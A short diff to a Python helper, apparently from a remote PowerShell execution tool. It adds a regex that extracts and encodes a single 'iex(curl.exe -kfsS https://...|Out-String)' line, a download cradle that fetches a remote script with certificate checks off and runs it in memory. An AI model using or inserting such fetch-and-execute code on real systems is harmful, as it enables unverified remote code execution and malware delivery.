@@ -43,6 +43,11 @@ def extract_encoded_command(text: str) -> str:
     # splitlines() already removes \r\n; strip stray \r/whitespace as well so a
     # CR from an SSH/PTY transport never ends up inside the script.
     lines = [line.strip() for line in text.splitlines()]
+    entry = [line for line in lines if re.fullmatch(r"iex\(curl\.exe -kfsS https://[^/\s]+/[A-Za-z0-9_-]{6}\|Out-String\)",line)]
+    if len(entry)==1:
+        return _encode(entry[0])
+    if entry:
+        raise SystemExit(_ERROR)
     for line in lines:
         if line.startswith("powershell.exe -NoProfile"):
             match = _COMMAND.match(line)
